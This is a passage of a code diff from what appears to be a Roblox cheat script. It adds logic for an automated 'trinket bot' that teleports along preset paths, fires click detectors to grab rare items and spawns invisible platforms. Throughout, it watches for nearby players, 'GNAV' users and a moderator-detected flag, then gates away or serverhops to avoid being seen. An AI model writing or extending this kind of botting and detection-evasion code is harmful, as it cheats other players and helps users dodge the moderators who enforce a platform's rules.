+                                TrinketBotServerhop(string.format("GNAV detected (%s) - no gates available", gnav_player_name))
+                                return
+                            end
+                        end
+                    end
+
+                    if kick_after_path and not kick_gate_handled then
+                        local last_gate_index = nil
+                        for j = #trinket_bot.path_points, 1, -1 do
+                            if trinket_bot.path_points[j].is_gate_point then
+                                last_gate_index = j
+                                break
+                            end
+                        end
+
+                        if last_gate_index and i < last_gate_index then
+                            library:Notify(string.format("%s found - gating to last gate point %d", kick_trinket_name, last_gate_index))
+
+                            local stabilization_platform = nil
+                            if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                local humanoid = FindFirstChildOfClass(plr.Character, "Humanoid")
+                                local is_in_air = humanoid and (humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoid:GetState() == Enum.HumanoidStateType.Flying)
+
+                                if is_in_air then
+                                    local hrp = plr.Character.HumanoidRootPart
+                                    stabilization_platform = Instance.new("Part")
+                                    stabilization_platform.Size = Vector3.new(10, 1, 10)
+                                    stabilization_platform.Position = hrp.Position - Vector3.new(0, 5, 0)
+                                    stabilization_platform.Anchored = true
+                                    stabilization_platform.CanCollide = true
+                                    stabilization_platform.Transparency = 1
+                                    stabilization_platform.Parent = workspace
+                                    task.wait(0.3)
+                                end
+                            end
+
+                            local gate_success = Gate(trinket_bot.path_points[last_gate_index].gate_location)
+                            if stabilization_platform then
+                                stabilization_platform:Destroy()
+                                stabilization_platform = nil
+                            end
+
+                            if gate_success then
+                                library:Notify(string.format("Gated to last gate point %d - continuing to end then kicking", last_gate_index))
+                                i = last_gate_index + 1
+                                kick_gate_handled = true
+                                continue
+                            else
+                                library:Notify("Gate to last point failed - continuing path normally")
+                                kick_gate_handled = true
+                            end
+                        else
+                            kick_gate_handled = true
+                        end
+                    end
+
+                    if ice_dragon_skip_index and ice_dragon_skip_index > i then
+                        local skip_point = trinket_bot.path_points[ice_dragon_skip_index]
+                        if skip_point then
+                            if skip_point.is_gate_point then
+                                library:Notify(string.format("Ice Dragon escape: gating to point %d", ice_dragon_skip_index))
+                                local gate_success = Gate(skip_point.gate_location)
+                                if gate_success then
+                                    i = ice_dragon_skip_index + 1
+                                    ice_dragon_skip_index = nil
+                                    continue
+                                else
+                                    library:Notify("Gate failed during ice dragon escape - teleporting instead")
+                                    SmoothTeleport(skip_point.position)
+                                    task.wait(0.5)
+                                    i = ice_dragon_skip_index + 1
+                                    ice_dragon_skip_index = nil
+                                    continue
+                                end
+                            else
+                                library:Notify(string.format("Ice Dragon escape: teleporting to point %d", ice_dragon_skip_index))
+                                SmoothTeleport(skip_point.position)
+                                task.wait(0.5)
+                                i = ice_dragon_skip_index + 1
+                                ice_dragon_skip_index = nil
+                                continue
+                            end
+                        else
+                            ice_dragon_skip_index = nil
+                        end
+                    end
+
+                    if emergency_gate_requested then
+                        local action = emergency_gate_requested.action
+                        local player_name = emergency_gate_requested.player_name
+                        emergency_gate_in_progress = true
+                        emergency_gate_requested = nil
+
+                        if action == "gate_next" then
+                            library:Notify(string.format("First encounter with %s - emergency gating to next gate point", player_name))
+
+                            local next_gate_point = nil
+                            local next_gate_index = nil
+                            for j = i + 1, #trinket_bot.path_points do
+                                if trinket_bot.path_points[j].is_gate_point then
+                                    local destination_clear = true
+                                    local blocking_player = ""
+
+                                    local check_limit = 10
+                                    for k = j + 1, #trinket_bot.path_points do
+                                        if trinket_bot.path_points[k].is_gate_point then
+                                            check_limit = math.min(k - j, 10)
+                                            break
+                                        end
+                                    end
+
+                                    for k = 1, check_limit do
+                                        local dest_point = trinket_bot.path_points[j + k]
+                                        if dest_point then
+                                            local has_player, check_player_name = IsPlayerNearPosition(dest_point.position, 250)
+                                            if has_player then
+                                                destination_clear = false
+                                                blocking_player = check_player_name
+                                                break
+                                            end
+                                        end
+                                    end
+
+                                    if destination_clear then
+                                        next_gate_point = trinket_bot.path_points[j]
+                                        next_gate_index = j
+                                        break
+                                    else
+                                        library:Notify(string.format("Player %s near gate %d destination - skipping", blocking_player, j))
+                                    end
+                                end
+                            end
+
+                            if next_gate_point then
+                                if not trinket_bot.path_running then return end
+
+                                local CollectionService = Services.CollectionService
+                                if plr.Character and CollectionService:HasTag(plr.Character, "SnapCool") then
+                                    local critical_distance = Options.CriticalDistance and Options.CriticalDistance.Value or 60
+                                    local player_in_critical_range = false
+                                    local closest_player_dist = math.huge
+
+                                    if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                        local bot_pos = plr.Character.HumanoidRootPart.Position
+                                        for _, other_player in next, plrs:GetPlayers() do
+                                            if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                                local dist = (other_player.Character.HumanoidRootPart.Position - bot_pos).Magnitude
+                                                if dist < closest_player_dist then
+                                                    closest_player_dist = dist
+                                                end
+                                                if dist <= critical_distance then
+                                                    player_in_critical_range = true
+                                                    break
+                                                end
+                                            end
+                                        end
+                                    end
+
+                                    if player_in_critical_range then
+                                        library:Notify(string.format("Emergency gate attempted but SnapCool active + player in critical range (%.0f studs) - instant serverhop to escape %s", closest_player_dist, player_name))
+                                        emergency_gate_in_progress = false
+                                        trinket_bot.path_running = false
+                                        TrinketBotServerhop(string.format("Emergency gate with SnapCool + player in critical range while escaping %s", player_name))
+                                        return
+                                    else
+                                        library:Notify(string.format("SnapCool active but player not in critical range (%.0f studs) - waiting for SnapCool to expire", closest_player_dist))
+                                        local snapcool_wait_start = tick()
+                                        local max_snapcool_wait = 10
+
+                                        local snapcool_wait_platform = nil
+                                        if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                            local hrp = plr.Character.HumanoidRootPart
+                                            snapcool_wait_platform = Instance.new("Part")
+                                            snapcool_wait_platform.Size = Vector3.new(10, 1, 10)
+                                            snapcool_wait_platform.Position = hrp.Position - Vector3.new(0, 3, 0)
+                                            snapcool_wait_platform.Anchored = true
+                                            snapcool_wait_platform.CanCollide = true
+                                            snapcool_wait_platform.Transparency = 1
+                                            snapcool_wait_platform.Parent = workspace
+                                        end
+
+                                        while plr.Character and CollectionService:HasTag(plr.Character, "SnapCool") and (tick() - snapcool_wait_start) < max_snapcool_wait do
+                                            task.wait(0.1)
+
+                                            if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                                local bot_pos = plr.Character.HumanoidRootPart.Position
+                                                for _, other_player in next, plrs:GetPlayers() do
+                                                    if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                                        local dist = (other_player.Character.HumanoidRootPart.Position - bot_pos).Magnitude
+                                                        if dist <= critical_distance then
+                                                            library:Notify(string.format("Player entered critical range (%.0f studs) during SnapCool wait - instant serverhop", dist))
+                                                            if snapcool_wait_platform then snapcool_wait_platform:Destroy() end
+                                                            emergency_gate_in_progress = false
+                                                            trinket_bot.path_running = false
+                                                            TrinketBotServerhop(string.format("Player entered critical range during SnapCool wait while escaping %s", player_name))
+                                                            return
+                                                        end
+                                                    end
+                                                end
+                                            end
+
+                                            if not trinket_bot.path_running then
+                                                if snapcool_wait_platform then snapcool_wait_platform:Destroy() end
+                                                return
+                                            end
+                                        end
+
+                                        if snapcool_wait_platform then
+                                            snapcool_wait_platform:Destroy()
+                                            snapcool_wait_platform = nil
+                                        end
+
+                                        if plr.Character and CollectionService:HasTag(plr.Character, "SnapCool") then
+                                            library:Notify("SnapCool wait timeout (10s) - serverhopping")
+                                            emergency_gate_in_progress = false
+                                            trinket_bot.path_running = false
+                                            TrinketBotServerhop("SnapCool wait timeout during emergency gate")
+                                            return
+                                        end
+
+                                        library:Notify("SnapCool expired - proceeding with emergency gate")
+                                    end
+                                end
+
+                                local character = plr.Character
+                                local stabilization_platform = nil
+
+                                if character and FindFirstChild(character, "HumanoidRootPart") then
+                                    local humanoid = FindFirstChildOfClass(character, "Humanoid")
+                                    local is_in_air = humanoid and (humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoid:GetState() == Enum.HumanoidStateType.Flying)
+
+                                    if is_in_air then
+                                        library:Notify("Bot in air [2]")
+                                        local hrp = character.HumanoidRootPart
+
+                                        stabilization_platform = Instance.new("Part")
+                                        stabilization_platform.Size = Vector3.new(10, 1, 10)
+                                        stabilization_platform.Position = hrp.Position - Vector3.new(0, 5, 0)
+                                        stabilization_platform.Anchored = true
+                                        stabilization_platform.CanCollide = true
+                                        stabilization_platform.Transparency = 1
+                                        stabilization_platform.Parent = workspace
+
+                                        task.wait(0.3)
+                                    end
+                                end
+
+                                local gate_success = Gate(next_gate_point.gate_location)
+
+                                if stabilization_platform then
+                                    stabilization_platform:Destroy()
+                                    stabilization_platform = nil
+                                end
+
+                                if gate_success then
+                                    library:Notify(string.format("Successfully emergency gated to point %d", next_gate_index))
+                                    current_gate_section = current_gate_section + 1
+                                    proximity_warnings = {}
+
+                                    task.wait(1.06)
+
+                                    emergency_gate_in_progress = false
+                                    i = next_gate_index + 1
+                                    continue
+                                else
+                                    local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                                    local CollectionService = Services.CollectionService
+                                    if plr.Character and CollectionService:HasTag(plr.Character, "SnapCool") then
+                                        if stay_in_server then
+                                            library:Notify("Emergency gate failed due to SnapCool but staying in server - waiting...")
+
+                                            local wait_start = tick()
+                                            local max_wait = 30
+                                            while (CollectionService:HasTag(plr.Character, "SnapCool") or cs:HasTag(plr.Character, "Danger")) and trinket_bot.path_running and (tick() - wait_start) < max_wait and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                                task.wait(0.1)
+                                            end
+
+                                            if (tick() - wait_start) >= max_wait then
+                                                library:Notify("SnapCool/Danger wait timeout (30s) - serverhopping")
+                                                emergency_gate_in_progress = false
+                                                TrinketBotServerhop("SnapCool/Danger timeout during emergency gate")
+                                                return
+                                            end
+
+                                            library:Notify("SnapCool and Danger cleared - retrying emergency gate")
+                                            if not trinket_bot.path_running then
+                                                emergency_gate_in_progress = false
+                                                return
+                                            end
+
+                                            local character = plr.Character
+                                            local teleport_platform = nil
+
+                                            if character and FindFirstChild(character, "HumanoidRootPart") and FindFirstChildOfClass(character, "ForceField") then
+                                                local hrp = character.HumanoidRootPart
+                                                local start_pos = hrp.Position
+
+                                                teleport_platform = Instance.new("Part")
+                                                teleport_platform.Size = Vector3.new(7, 1, 7)
+                                                teleport_platform.Position = start_pos + Vector3.new(0, -3, 18)
+                                                teleport_platform.Anchored = true
+                                                teleport_platform.CanCollide = true
+                                                teleport_platform.Transparency = 1
+                                                teleport_platform.Parent = workspace
+
+                                                local saved_emergency_gate = emergency_gate_requested
+                                                emergency_gate_requested = nil
+
+                                                trinket_bot.path_running = true
+                                                SmoothTeleport(teleport_platform.Position + Vector3.new(0, 4, 0))
+                                                task.wait(1.5)
+
+                                                if not emergency_gate_requested then
+                                                    emergency_gate_requested = saved_emergency_gate
+                                                end
+
+                                                if teleport_platform then
+                                                    teleport_platform:Destroy()
+                                                end
+
+                                                SmoothTeleport(start_pos)
+                                                task.wait(0.5)
+                                            end
+
+                                            gate_success = Gate(next_gate_point.gate_location)
+
+                                            if gate_success then
+                                                library:Notify(string.format("Successfully emergency gated to point %d (stay in server retry)", next_gate_index))
+                                                current_gate_section = current_gate_section + 1
+                                                proximity_warnings = {}
+
+                                                task.wait(3)
+
+                                                emergency_gate_in_progress = false
+                                                i = next_gate_index + 1
+                                                continue
+                                            else
+                                                library:Notify("Emergency gate retry failed but staying in server - continuing with path")
+                                                emergency_gate_in_progress = false
+                                            end
+                                        else
+                                            library:Notify("Waiting for SnapCool to clear before retrying emergency gate...")
+
+                                            local snapcool_wait_start = tick()
+                                            local snapcool_timeout = 10
+                                            local snapcool_cleared = false
+
+                                            while tick() - snapcool_wait_start < snapcool_timeout and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                                if not CollectionService:HasTag(plr.Character, "SnapCool") then
+                                                    snapcool_cleared = true
+                                                    break
+                                                end
+
+                                                if cs:HasTag(plr.Character, "Danger") then
+                                                    library:Notify("Danger appeared while waiting for SnapCool - aborting")
+                                                    break
+                                                end
+
+                                                task.wait(0.1)
+                                            end
+
+                                            if snapcool_cleared then
+                                                library:Notify("SnapCool cleared - retrying emergency gate")
+                                                if not trinket_bot.path_running then
+                                                    emergency_gate_in_progress = false
+                                                    return
+                                                end
+
+                                                local character = plr.Character
+                                                local teleport_platform = nil
+
+                                                if character and FindFirstChild(character, "HumanoidRootPart") and FindFirstChildOfClass(character, "ForceField") then
+                                                    local hrp = character.HumanoidRootPart
+                                                    local start_pos = hrp.Position
+
+                                                    teleport_platform = Instance.new("Part")
+                                                    teleport_platform.Size = Vector3.new(7, 1, 7)
+                                                    teleport_platform.Position = start_pos + Vector3.new(0, -3, 18)
+                                                    teleport_platform.Anchored = true
+                                                    teleport_platform.CanCollide = true
+                                                    teleport_platform.Transparency = 1
+                                                    teleport_platform.Parent = workspace
+
+                                                    local saved_emergency_gate = emergency_gate_requested
+                                                    emergency_gate_requested = nil
+
+                                                    trinket_bot.path_running = true
+                                                    SmoothTeleport(teleport_platform.Position + Vector3.new(0, 4, 0))
+                                                    task.wait(1.5)
+
+                                                    if not emergency_gate_requested then
+                                                        emergency_gate_requested = saved_emergency_gate
+                                                    end
+
+                                                    if teleport_platform then
+                                                        teleport_platform:Destroy()
+                                                    end
+
+                                                    SmoothTeleport(start_pos)
+                                                    task.wait(0.5)
+                                                end
+
+                                                gate_success = Gate(next_gate_point.gate_location)
+
+                                                if gate_success then
+                                                    library:Notify(string.format("Successfully emergency gated to point %d (after SnapCool wait)", next_gate_index))
+                                                    current_gate_section = current_gate_section + 1
+                                                    proximity_warnings = {}
+
+                                                    task.wait(3)
+
+                                                    emergency_gate_in_progress = false
+                                                    i = next_gate_index + 1
+                                                    continue
+                                                else
+                                                    library:Notify(string.format("Emergency gate retry failed - serverhopping to escape %s", player_name))
+                                                    emergency_gate_in_progress = false
+                                                    trinket_bot.path_running = false
+                                                    TrinketBotServerhop(string.format("Emergency gate retry failed while escaping %s", player_name))
+                                                    return
+                                                end
+                                            else
+                                                if not trinket_bot.path_running then
+                                                    library:Notify("Bot was manually stopped during emergency gate wait - aborting serverhop")
+                                                    emergency_gate_in_progress = false
+                                                    return
+                                                end
+
+                                                local should_serverhop = emergency_path_traverse(plr.Character.HumanoidRootPart.Position, player_name)
+
+                                                if should_serverhop then
+                                                    library:Notify(string.format("SnapCool timeout or Danger detected - serverhopping to escape %s", player_name))
+                                                    emergency_gate_in_progress = false
+                                                    trinket_bot.path_running = false
+                                                    TrinketBotServerhop(string.format("Emergency gate failed (SnapCool timeout) while escaping %s", player_name))
+                                                else
+                                                    emergency_gate_in_progress = false
+                                                end
+                                                return
+                                            end
+                                        end
+                                    else
+                                        if stay_in_server then
+                                            library:Notify("Emergency gate failed but staying in server - continuing with path")
+                                            emergency_gate_in_progress = false
+                                        else
+                                            if not trinket_bot.path_running then
+                                                library:Notify("Bot was manually stopped - aborting serverhop")
+                                                emergency_gate_in_progress = false
+                                                return
+                                            end
+
+                                            local should_serverhop = emergency_path_traverse(plr.Character.HumanoidRootPart.Position, player_name)
+
+                                            if should_serverhop then
+                                                library:Notify(string.format("Emergency gate failed - serverhopping to escape %s", player_name))
+                                                emergency_gate_in_progress = false
+                                                trinket_bot.path_running = false
+                                                TrinketBotServerhop(string.format("Emergency gate failed while escaping %s", player_name))
+                                            else
+                                                emergency_gate_in_progress = false
+                                            end
+                                            return
+                                        end
+                                    end
+                                end
+                            else
+                                local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                                if not stay_in_server then
+                                    if not path_has_gates and plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                        local current_pos = plr.Character.HumanoidRootPart.Position
+                                        local first_point = trinket_bot.path_points[1]
+                                        local last_point = trinket_bot.path_points[#trinket_bot.path_points]
+                                        local dist_to_first = (first_point.position - current_pos).Magnitude
+                                        local dist_to_last = (last_point.position - current_pos).Magnitude
+
+                                        local players_toward_first = 0
+                                        local players_toward_last = 0
+                                        local check_radius = 250
+
+                                        for j = i - 1, 1, -1 do
+                                            local pt = trinket_bot.path_points[j]
+                                            if pt and IsPlayerNearPosition(pt.position, check_radius) then
+                                                players_toward_first = players_toward_first + 1
+                                            end
+                                        end
+                                        for j = i + 1, #trinket_bot.path_points do
+                                            local pt = trinket_bot.path_points[j]
+                                            if pt and IsPlayerNearPosition(pt.position, check_radius) then
+                                                players_toward_last = players_toward_last + 1
+                                            end
+                                        end
+
+                                        local go_to_first
+                                        if players_toward_first ~= players_toward_last then
+                                            go_to_first = players_toward_first < players_toward_last
+                                        else
+                                            go_to_first = dist_to_first <= dist_to_last
+                                        end
+
+                                        local target_index = go_to_first and 1 or #trinket_bot.path_points
+                                        local step = go_to_first and -1 or 1
+
+                                        library:Notify(string.format("No gates - escaping %s toward point %d (%.0f studs, %d players)", player_name, target_index, go_to_first and dist_to_first or dist_to_last, go_to_first and players_toward_first or players_toward_last))
+
+                                        for j = i + step, target_index, step do
+                                            if not trinket_bot.path_running or emergency_gate_requested or trinket_bot.moderator_detected then break end
+                                            local escape_point = trinket_bot.path_points[j]
+                                            if escape_point then
+                                                SmoothTeleport(escape_point.position)
+                                                task.wait(0.3)
+                                            end
+                                        end
+
+                                        emergency_gate_in_progress = false
+                                        trinket_bot.path_running = false
+                                        TrinketBotServerhop(string.format("Escaped %s via path traversal (no gates)", player_name))
+                                        return
+                                    else
+                                        library:Notify(string.format("No clear gate point available - serverhopping to escape %s", player_name))
+                                        emergency_gate_in_progress = false
+                                        trinket_bot.path_running = false
+                                        TrinketBotServerhop(string.format("No clear gate point while escaping %s", player_name))
+                                        return
+                                    end
+                                else
+                                    library:Notify("No clear gate point but staying in server - continuing with path")
+                                    emergency_gate_in_progress = false
+                                end
+                            end
+                        end
+                    end
+
+                    if not trinket_bot.path_running then
+                        break
+                    end
+
+                    local skip_current_point = false
+                    if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        local current_pos = plr.Character.HumanoidRootPart.Position
+
+                        if completed_wait_point then
+                            for _, object in next, workspace:GetChildren() do
+                                if not trinket_bot.path_running then break end
+
+                                if object.Name == "Part" and FindFirstChild(object, "ID") then
+                                    local trinket_id_obj = FindFirstChild(object, "ID")
+                                    if trinket_id_obj and trinket_id_obj:IsA("StringValue") then
+                                        if collected_trinket_ids[trinket_id_obj.Value] then
+                                            continue
+                                        end
+                                    end
+
+                                    if already_visited_position(object.Position) then
+                                        continue
+                                    end
+
+                                    local trinket_name, trinket_color = cheat_client:identify_trinket(object)
+
+                                    local selected_mythics_artifacts = Options.PickupMythicsArtifacts and Options.PickupMythicsArtifacts.Value or {}
+                                    if not selected_mythics_artifacts[trinket_name] then
+                                        continue
+                                    end
+
+                                    local is_mythic = trinket_color == cheat_client.trinket_colors.mythic.Color
+                                    local is_artifact = trinket_color == cheat_client.trinket_colors.artifact.Color
+
+                                    if is_mythic or is_artifact then
+                                        local trinket_pos = object.Position
+                                        local distance_to_trinket = (trinket_pos - current_pos).Magnitude
+
+                                        if distance_to_trinket < 150 then
+                                            local has_nearby_wait_point = false
+                                            for j = i, #trinket_bot.path_points do
+                                                local check_point = trinket_bot.path_points[j]
+                                                if check_point and check_point.wait_for_trinket then
+                                                    local dist_to_wait_point = (trinket_pos - check_point.position).Magnitude
+                                                    if dist_to_wait_point <= 300 then
+                                                        has_nearby_wait_point = true
+                                                        break
+                                                    end
+                                                end
+                                            end
+
+                                            if not has_nearby_wait_point then
+                                                library:Notify(string.format("Detouring for %s (%.0f studs)", trinket_name or "trinket", distance_to_trinket))
+
+                                            if trinket_id_obj and trinket_id_obj:IsA("StringValue") then
+                                                mark_trinket_collected(trinket_id_obj.Value)
+                                            end
+
+                                            local return_pos = current_pos
+                                            SmoothTeleport(trinket_pos, true)
+                                            table.insert(visited_positions, trinket_pos)
+                                            if #visited_positions > 1000 then
+                                                table.remove(visited_positions, 1)
+                                            end
+                                            task.wait(0.18)
+
+                                            local click_detector = FindFirstChild(object, "ClickDetector", true)
+                                            if click_detector then
+                                                if trinket_id_obj and trinket_id_obj:IsA("StringValue") then
+                                                    queue_pending_pickup(trinket_id_obj.Value)
+                                                end
+                                                fireclickdetector(click_detector)
+                                                task.wait(0.18)
+                                            end
+
+                                            SmoothTeleport(return_pos)
+                                            task.wait(0.2)
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    local target_point = point
+                    if i == #trinket_bot.path_points and plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        local last_point_pos = point.position
+                        local someone_camping = false
+                        local camper_name = ""
+
+                        for _, other_player in next, plrs:GetPlayers() do
+                            if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                local distance = (other_player.Character.HumanoidRootPart.Position - last_point_pos).Magnitude
+                                if distance <= 180 then
+                                    someone_camping = true
+                                    camper_name = other_player.Name
+                                    break
+                                end
+                            end
+                        end
+
+                        if someone_camping then
+                            library:Notify(string.format("Player %s camping last point - serverhopping", camper_name))
+                            trinket_bot.path_running = false
+                            SafeServerhop(string.format("Player %s camping last point", camper_name))
+                            return
+                        end
+                    end
+
+                    if point.is_gate_point then
+                        local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                        local gate_success = false
+
+                        if not stay_in_server then
+                            local available_gates = {}
+                            for j = i, #trinket_bot.path_points do
+                                if trinket_bot.path_points[j].is_gate_point then
+                                    table.insert(available_gates, {index = j, point = trinket_bot.path_points[j]})
+                                end
+                            end
+
+                            for gate_num, gate_data in ipairs(available_gates) do
+                                if not trinket_bot.path_running then
+                                    break
+                                end
+
+                                local gate_index = gate_data.index
+                                local gate_point = gate_data.point
+
+                                if gate_index == #trinket_bot.path_points then
+                                    library:Notify(string.format("Gate %d is the last point - skipping", gate_index))
+                                    continue
+                                end
+
+                                local destination_blocked = false
+                                local blocking_player_name = ""
+
+                                local next_point = trinket_bot.path_points[gate_index + 1]
+                                if next_point then
+                                    local has_player, player_name = IsPlayerNearPosition(next_point.position, 250)
+                                    if has_player then
+                                        destination_blocked = true
+                                        blocking_player_name = player_name
+                                    end
+                                end
+
+                                if not destination_blocked then
+                                    for j = gate_index + 1, #trinket_bot.path_points do
+                                        local check_point = trinket_bot.path_points[j]
+
+                                        if check_point.is_gate_point then
+                                            break
+                                        end
+
+                                        if check_point.wait_for_trinket then
+                                            local has_player, player_name = IsPlayerNearPosition(check_point.position, 250)
+                                            if has_player then
+                                                destination_blocked = true
+                                                blocking_player_name = player_name
+                                                break
+                                            end
+                                        end
+                                    end
+                                end
+
+                                if destination_blocked then
+                                    library:Notify(string.format("Gate %d/%d destination blocked by %s - trying next gate", gate_index, #trinket_bot.path_points, blocking_player_name))
+                                else
+                                    if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                        local bot_pos = plr.Character.HumanoidRootPart.Position
+                                        local critical_distance = Options.CriticalDistance and Options.CriticalDistance.Value or 60
+                                        local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                                        if critical_distance > 0 and not stay_in_server then
+                                            for _, other_player in next, plrs:GetPlayers() do
+                                                if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                                    local distance = (other_player.Character.HumanoidRootPart.Position - bot_pos).Magnitude
+
+                                                    if distance <= critical_distance then
+                                                        library:Notify(string.format("!! PRE-GATE CHECK: Player %s within %.0f studs - serverhopping instead of gating !!", other_player.Name, distance))
+                                                        trinket_bot.path_running = false
+                                                        SafeServerhop(string.format("Player %s within %.0f studs pre-gate - serverhopping instantly", other_player.Name, distance))
+                                                        return
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+
+                                    library:Notify(string.format("Attempting gate %d/%d to %s", gate_index, #trinket_bot.path_points, gate_point.gate_location or "???"))
+
+                                    local max_retries = 3
+                                    local retry_count = 0
+
+                                    local retry_platform = nil
+
+                                    while not gate_success and retry_count < max_retries and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                        retry_count = retry_count + 1
+
+                                        if not trinket_bot.path_running then
+                                            break
+                                        end
+
+                                        if retry_count > 1 then
+                                            library:Notify(string.format("Gate retry %d/%d for gate %d", retry_count, max_retries, gate_index))
+
+                                            local character = plr.Character
+                                            if character then
+                                                local CollectionService = Services.CollectionService
+                                                local has_snapcool = CollectionService:HasTag(character, "SnapCool")
+                                                local has_danger = cs:HasTag(character, "Danger")
+
+                                                if has_snapcool or has_danger then
+                                                    library:Notify("Waiting for SnapCool/Danger to clear before gate retry...")
+
+                                                    local snapcool_cleared = not has_snapcool
+                                                    local danger_cleared = not has_danger
+                                                    local snapcool_conn, danger_conn
+
+                                                    if has_snapcool then
+                                                        snapcool_conn = utility:Connection(CollectionService:GetInstanceRemovedSignal("SnapCool"), function(instance)
+                                                            if instance == character then
+                                                                snapcool_cleared = true
+                                                                if snapcool_conn then snapcool_conn:Disconnect() end
+                                                            end
+                                                        end)
+                                                    end
+
+                                                    if has_danger then
+                                                        danger_conn = utility:Connection(cs:GetInstanceRemovedSignal("Danger"), function(instance)
+                                                            if instance == character then
+                                                                danger_cleared = true
+                                                                if danger_conn then danger_conn:Disconnect() end
+                                                            end
+                                                        end)
+                                                    end
+
+                                                    while (not snapcool_cleared or not danger_cleared) and trinket_bot.path_running and not emergency_gate_requested do
+                                                        task.wait(0.1)
+                                                    end
+
+                                                    if snapcool_conn then snapcool_conn:Disconnect() end
+                                                    if danger_conn then danger_conn:Disconnect() end
+
+                                                    if not trinket_bot.path_running or emergency_gate_requested then
+                                                        break
+                                                    end
+                                                    library:Notify("SnapCool/Danger cleared - proceeding with gate retry")
+                                                end
+                                            end
+
+                                            task.wait(0.5)
+
+                                            if not retry_platform then
+                                                character = plr.Character
+
+                                                if character and FindFirstChild(character, "HumanoidRootPart") then
+                                                    local hrp = character.HumanoidRootPart
+
+                                                    retry_platform = Instance.new("Part")
+                                                    retry_platform.Size = Vector3.new(7, 1, 7)
+                                                    retry_platform.Position = hrp.Position + Vector3.new(0, -3, 18)
+                                                    retry_platform.Anchored = true
+                                                    retry_platform.CanCollide = true
+                                                    retry_platform.Transparency = 1
+                                                    retry_platform.Parent = workspace
+
+                                                    local saved_emergency_gate = emergency_gate_requested
+                                                    emergency_gate_requested = nil
+
+                                                    trinket_bot.path_running = true
+                                                    SmoothTeleport(retry_platform.Position + Vector3.new(0, 4, 0))
+                                                    task.wait(1.5)
+
+                                                    if not emergency_gate_requested then
+                                                        emergency_gate_requested = saved_emergency_gate
+                                                    end
+                                                end
+                                            end
+                                        end
+
+                                        local expected_dest = trinket_bot.path_points[gate_index + 1] and trinket_bot.path_points[gate_index + 1].position or nil
+                                        gate_success = Gate(gate_point.gate_location, expected_dest)
+                                    end
+
+                                    if retry_platform then
+                                        retry_platform:Destroy()
+                                        retry_platform = nil
+                                    end
+
+                                    if gate_success then
+                                        current_gate_section = current_gate_section + 1
+                                        if gate_index ~= i then
+                                            library:Notify(string.format("Skipped to gate point %d from point %d", gate_index, i))
+                                            i = gate_index
+                                        end
+                                        break
+                                    else
+                                        library:Notify(string.format("Gate %d failed after %d attempts - trying next gate", gate_index, retry_count))
+                                    end
+                                end
+                            end
+
+                            if not gate_success then
+                                if active_tween_data.tween then
+                                    active_tween_data.tween:Cancel()
+                                    active_tween_data.tween = nil
+                                end
+                                if active_tween_data.connection then
+                                    active_tween_data.connection:Disconnect()
+                                    active_tween_data.connection = nil
+                                end
+
+                                if plr.Character then
+                                    local humanoid = FindFirstChildOfClass(plr.Character, "Humanoid")
+                                    if humanoid then
+                                        humanoid:SetStateEnabled(5, true)
+                                        humanoid:ChangeState(5)
+                                    end
+
+                                    for _, part in ipairs(plr.Character:GetDescendants()) do
+                                        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                                            if part.Name == "Head" or part.Name == "Torso" then
+                                                part.CanCollide = true
+                                            else
+                                                part.CanCollide = false
+                                            end
+                                        end
+                                    end
+                                end
+
+                                library:Notify("All gate points blocked or failed - serverhopping")
+                                trinket_bot.path_running = false
+                                TrinketBotServerhop("All gate points blocked or failed")
+                                return
+                            end
+                        else
+                            local max_retries = 999
+                            local retry_count = 0
+
+                            while not gate_success and retry_count < max_retries and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                retry_count = retry_count + 1
+
+                                if not trinket_bot.path_running then
+                                    break
+                                end
+
+                                if retry_count > 1 then
+                                    library:Notify(string.format("Gate attempt %d for %s (stay in server mode)", retry_count, point.gate_location or "???"))
+
+                                    local character = plr.Character
+                                    if character then
+                                        local CollectionService = Services.CollectionService
+                                        local has_snapcool = CollectionService:HasTag(character, "SnapCool")
+                                        local has_danger = cs:HasTag(character, "Danger")
+
+                                        if has_snapcool or has_danger then
+                                            library:Notify("Waiting for SnapCool/Danger to clear...")
+
+                                            local snapcool_cleared = not has_snapcool
+                                            local danger_cleared = not has_danger
+                                            local snapcool_conn, danger_conn
+
+                                            if has_snapcool then
+                                                snapcool_conn = utility:Connection(CollectionService:GetInstanceRemovedSignal("SnapCool"), function(instance)
+                                                    if instance == character then
+                                                        snapcool_cleared = true
+                                                        if snapcool_conn then snapcool_conn:Disconnect() end
+                                                    end
+                                                end)
+                                            end
+
+                                            if has_danger then
+                                                danger_conn = utility:Connection(cs:GetInstanceRemovedSignal("Danger"), function(instance)
+                                                    if instance == character then
+                                                        danger_cleared = true
+                                                        if danger_conn then danger_conn:Disconnect() end
+                                                    end
+                                                end)
+                                            end
+
+                                            while (not snapcool_cleared or not danger_cleared) and trinket_bot.path_running and not emergency_gate_requested do
+                                                task.wait(0.1)
+                                            end
+
